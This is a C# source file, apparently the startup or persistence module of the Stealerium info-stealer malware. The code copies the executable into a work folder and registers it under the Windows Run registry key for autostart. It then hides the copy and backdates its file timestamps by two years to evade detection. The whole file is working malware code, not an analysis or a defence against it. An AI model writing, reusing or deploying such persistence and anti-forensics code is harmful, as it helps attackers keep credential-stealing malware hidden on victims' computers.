using System;
using System.IO;
using Microsoft.Win32;
using Stealerium.Helpers;

namespace Stealerium.Modules.Implant;

internal sealed class Startup
{
	public static readonly string ExecutablePath = AppDomain.CurrentDomain.BaseDirectory;

	private static readonly string InstallDirectory = Paths.InitWorkDir();

	private static readonly string InstallFile = Path.Combine(InstallDirectory, new FileInfo(ExecutablePath).Name);

	private static readonly string StartupKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	private static readonly string StartupName = Path.GetFileNameWithoutExtension(ExecutablePath);

	public static void SetFileCreationDate(string path = null)
	{
		string text = path;
		if (path == null)
		{
			text = ExecutablePath;
		}
		Logging.Log("SetFileCreationDate : Changing file " + text + " creation data");
		DateTime dateTime = new DateTime(DateTime.Now.Year - 2, 5, 22, 3, 16, 28);
		File.SetCreationTime(text, dateTime);
		File.SetLastWriteTime(text, dateTime);
		File.SetLastAccessTime(text, dateTime);
	}

	public static void HideFile(string path = null)
	{
		string text = path;
		if (path == null)
		{
			text = ExecutablePath;
		}
		Logging.Log("HideFile : Adding 'hidden' attribute to file " + text);
		new FileInfo(text).Attributes |= FileAttributes.Hidden;
	}

	public static bool IsInstalled()
	{
		if (Registry.CurrentUser.OpenSubKey(StartupKey, writable: false)?.GetValue(StartupName) != null)
		{
			return File.Exists(InstallFile);
		}
		return false;
	}

	public static void Install()
	{
		Logging.Log("Startup : Adding to autorun...");
		if (!File.Exists(InstallFile))
		{
			File.Copy(ExecutablePath, InstallFile);
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(StartupKey, writable: true);
		if (registryKey != null && registryKey.GetValue(StartupName) == null)
		{
			registryKey.SetValue(StartupName, InstallFile);
		}
		string[] array = new string[1] { InstallFile };
		foreach (string text in array)
		{
			if (File.Exists(text))
			{
				HideFile(text);
				SetFileCreationDate(text);
			}
		}
	}

	public static bool IsFromStartup()
	{
		return ExecutablePath.StartsWith(InstallDirectory);
	}
}
